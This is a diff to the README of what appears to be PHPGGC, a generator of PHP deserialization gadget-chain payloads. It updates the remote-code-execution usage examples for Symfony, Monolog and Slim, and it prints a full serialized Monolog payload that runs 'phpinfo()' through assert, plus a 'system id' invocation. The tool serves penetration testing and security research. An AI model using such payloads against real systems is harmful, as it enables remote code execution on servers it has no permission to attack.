@@ -62,14 +62,14 @@ Vector         : __destruct
 Informations   : 
 Exec through proc_open()
 
-./phpggc Symfony/RCE1 <code>
+./phpggc Symfony/RCE1 <command>
 ```
 
 Once you have selected a chain, run `./phpggc <gadget-chain> [parameters]` to obtain the payload.
 For instance, to obtain a payload for Monolog, you'd do:
 
 ```
-$ ./phpggc monolog/rce1 'phpinfo();'
+$ ./phpggc monolog/rce1 assert 'phpinfo()'
 O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:2;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:10:"phpinfo();";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}}
 ```
 
@@ -109,7 +109,7 @@ function wrapper($chain)
 And you'd call phpggc like so:
 
 ```
-$ ./phpggc -w /tmp/my_wrapper.php slim/rce1 'phpinfo();'
+$ ./phpggc -w /tmp/my_wrapper.php slim/rce1 system id
 a:1:{s:7:"message";O:18:"Slim\Http\Response":2:{...}}
 ```
 
@@ -117,7 +117,6 @@ a:1:{s:7:"message";O:18:"Slim\Http\Response":2:{...}}
 
 Pull requests are more than welcome. Please follow these simple guidelines:
 
-- Error-free payloads are prefered, as some websites exit abruptly even with E_NOTICE errors
 - `__destruct()` is always the best vector
 - Specify at least the version of the library you've built the payload on
 - Refrain from using references unless it is necessary or drastically reduces the size of the payload. If the payload is modified by hand afterwards, this might cause problems.
